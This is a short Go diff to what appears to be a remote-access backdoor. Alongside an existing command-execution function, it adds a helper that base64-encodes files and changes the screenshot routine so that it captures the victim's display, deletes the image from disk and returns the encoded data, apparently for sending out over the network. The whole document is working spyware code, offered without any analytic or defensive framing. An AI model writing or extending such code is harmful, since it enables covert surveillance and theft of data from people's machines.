@@ -4,6 +4,7 @@ package main
 
 import (
 	"bufio"
+	b64 "encoding/base64"
 	"fmt"
 	"image/png"
 	"net"
@@ -58,10 +59,18 @@ func exec_cmd(cmd string) string {
 	return string(result)
 }
 
+func file_b64(file string) string {
+	content, _ := os.ReadFile(file)
+	return b64.StdEncoding.EncodeToString(content)
+}
+
 func capture_scr() string {
 	bounds := screenshot.GetDisplayBounds(0)
 	img, _ := screenshot.CaptureRect(bounds)
 	file, _ := os.Create("scrshot.png")
 	defer file.Close()
 	png.Encode(file, img)
+	scrshot := file_b64("scrshot.png")
+	os.Remove("scrshot.png")
+	return scrshot
 }
